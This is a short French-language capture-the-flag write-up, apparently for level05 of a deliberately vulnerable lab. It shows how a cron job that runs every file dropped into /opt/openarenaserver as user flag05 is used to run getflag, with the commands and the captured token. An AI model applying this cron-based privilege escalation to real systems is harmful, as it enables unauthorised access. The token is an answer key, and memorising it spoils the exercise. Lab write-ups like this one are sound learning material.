## Démarche

- Panne d'inspi
- Refaire les demarches des précédents
    ```
    find / -name level05  -print 2>/dev/null 
    ```
    > /var/mail/level05
    
    > /rofs/var/mail/level05
    
    ```
    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
    ``` 
    ????????
 ------
  ```
  $> find / -user flag05 -perm -000 -print 2>/dev/null
  ```
  BINGO

    >    ./usr/sbin/openarenaserver

    >   ./rofs/usr/sbin/openarenaserver


```
    cat ./usr/sbin/openarenaserver
```


```
    #!/bin/sh

    for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
    done
```

touch test.sh
```
#!/bin/bash

/bin/getflag > /tmp/flag05
```
```
 cat /tmp/flag05
```
> Check flag.Here is your token : viuaaale9huek52boumoomioc
> 

## Ressources

- https://www.digitalocean.com/community/questions/how-to-manage-var-mail-root-file
- https://www.hostinger.fr/tutoriels/cron-job/

